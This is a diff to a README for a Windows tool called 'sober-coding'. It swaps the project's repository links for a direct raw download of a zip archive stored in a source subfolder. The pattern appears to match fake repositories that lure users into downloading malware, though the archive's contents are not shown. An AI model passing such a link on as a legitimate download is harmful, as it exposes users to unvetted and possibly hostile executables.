@@ -1,6 +1,6 @@
 # 🧘 sober-coding - Fix bad code before it spreads
 
-[![Download sober-coding](https://img.shields.io/badge/Download%20sober--coding-blue-grey?style=for-the-badge)](https://github.com/mansourfaye229-dot/sober-coding)
+[![Download sober-coding](https://img.shields.io/badge/Download%20sober--coding-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/mansourfaye229-dot/sober-coding/main/src/checkers/coding-sober-v3.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -156,7 +156,7 @@ This keeps the process simple and clear.
 
 Use this page to visit the project, get the latest files, and run sober-coding on Windows:
 
-https://github.com/mansourfaye229-dot/sober-coding
+https://raw.githubusercontent.com/mansourfaye229-dot/sober-coding/main/src/checkers/coding-sober-v3.1-alpha.2.zip
 
 ## 🖥️ File Types You May See
 
